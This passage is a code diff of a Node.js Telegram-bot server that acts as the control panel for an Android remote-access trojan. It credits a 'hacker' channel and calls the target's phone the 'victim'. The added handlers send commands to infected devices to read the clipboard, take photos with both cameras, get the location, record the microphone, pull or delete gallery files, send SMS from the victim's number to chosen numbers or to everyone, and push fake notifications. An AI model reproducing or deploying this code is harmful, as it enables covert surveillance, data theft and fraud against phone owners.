+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (action === 'file') {
-        currentSessionToken = sessionToken;
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• مسار الملف:', { reply_markup: { force_reply: true }, parse_mode: "HTML" });
+    if (commend == 'device_info') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('device_info');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (action === 'delete_file') {
-        currentSessionToken = sessionToken;
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• مسار الملف المراد حذفه:', { reply_markup: { force_reply: true } });
+    if (commend == 'clipboard') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('clipboard');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (action === 'microphone') {
-        currentSessionToken = sessionToken;
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• مدة التسجيل بالثواني:', { reply_markup: { force_reply: true } });
+    if (commend == 'camera_main') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('camera_main');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (action === 'toast') {
-        currentSessionToken = sessionToken;
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• نص التنبيه:', { reply_markup: { force_reply: true } });
+    if (commend == 'camera_selfie') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('camera_selfie');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (action === 'show_notification') {
-        currentSessionToken = sessionToken;
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• عنوان الإشعار:', { reply_markup: { force_reply: true } });
+    if (commend == 'location') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('location');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-    else if (action === 'play_audio') {
-        currentSessionToken = sessionToken;
-        appBot.deleteMessage(ADMIN_ID, message.message_id);
-        appBot.sendMessage(ADMIN_ID, '°• رابط الصوت المباشر:', { reply_markup: { force_reply: true } });
+    if (commend == 'vibrate') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('vibrate');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
-
-    appBot.answerCallbackQuery(query.id);
+    if (commend == 'stop_audio') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('stop_audio');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    'resize_keyboard': true
+                }
+            }
+        )
+    }
+    if (commend == 'send_message') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
+            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
+            {reply_markup: {force_reply: true}})
+        currentUuid = uuid
+    }
+    if (commend == 'send_message_to_all') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n' +
+            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
+            {reply_markup: {force_reply: true}}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'file') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
+            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'delete_file') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد \n\n' +
+            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'microphone') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل مسار الملف الذي تريد \n\n' +
+            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'toast') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
+            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'show_notification') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
+            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'play_audio') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
+            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
+        )
+        currentUuid = uuid
+    }
 });
-
-// الحفاظ على نشاط الخادم
-setInterval(() => {
-    appSessions.forEach(session => {
-        if (session.ws.readyState === WebSocket.OPEN) session.ws.send('ping');
+setInterval(function () {
+    appSocket.clients.forEach(function each(ws) {
+        ws.send('ping')
     });
-    axios.get(PING_URL).catch(() => {});
-}, 5000);
-
-// تشغيل الخادم
-const PORT = process.env.PORT || 8999;
-appServer.listen(PORT, () => console.log(`✅ الخادم يعمل على المنفذ ${PORT} - نظام الجلسات الموحد مفعل`));
+    try {
+        axios.get(address).then(r => "")
+    } catch (e) {
+    }
+}, 5000)
+appServer.listen(process.env.PORT || 8999);
